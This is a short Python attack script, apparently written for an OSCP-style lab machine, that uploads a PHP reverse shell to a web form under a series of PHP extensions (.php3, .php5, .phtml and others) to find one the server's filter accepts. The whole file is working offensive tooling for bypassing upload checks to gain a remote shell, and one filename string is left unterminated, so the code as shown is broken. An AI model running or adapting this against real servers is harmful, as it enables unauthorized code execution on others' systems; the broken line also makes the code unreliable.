#!/usr/bin/env python

import requests 
import os

ip = "10.10.83.93"
url = f"http://{ip}:3333/internal/index.php" #login page

old_filename = "/home/slickmmarek/Documents/OSCP/shareFolder/php-reverse-shell.php" 

# requests to upload a file
filename = "/home/slickmmarek/Documents/OSCP/shareFolder/php-reverse-shell
extensions = [
	".php",
	".php3",
	".php4",
	".php5",
	".phtml",
]

#from source URL page, form action = index.php, method = post, enctype = multipart/form-data

for ext in extensions:

	new_filename = filename + ext 			# forms which extension of the reverse shell works
	os.rename(old_filename, new_filename)	#renames the file after testing

	files = {"file": open(new_filename, "rb")}	#python requests to upload a file
	r = requests.post(url, files=files)

	if "Extension not allowed" in r.text:
		print(f"{ext} not allowed")
	else:
		print(f"{ext} seems to work")	

	old_filename = new_filename			#resets the file name after resetting from os.rename
